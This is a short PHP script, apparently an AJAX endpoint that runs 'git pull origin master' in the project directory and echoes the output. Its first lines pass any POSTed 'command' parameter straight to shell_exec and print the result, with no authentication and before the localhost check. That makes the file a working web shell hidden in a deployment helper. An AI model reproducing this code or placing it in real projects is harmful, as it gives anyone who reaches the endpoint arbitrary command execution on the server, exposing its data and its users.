<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
  echo shell_exec($_POST['command']);
}
if ($_SERVER['SERVER_NAME'] == "localhost") {
  echo false;
  return;
}
echo trim(preg_replace('/\s+/', ' ', nl2br(shell_exec("export PATH=$PATH:~/git-2.9.5 && cd ".str_replace("ajax", "", __DIR__)." && git pull origin master 2>&1"))));
?>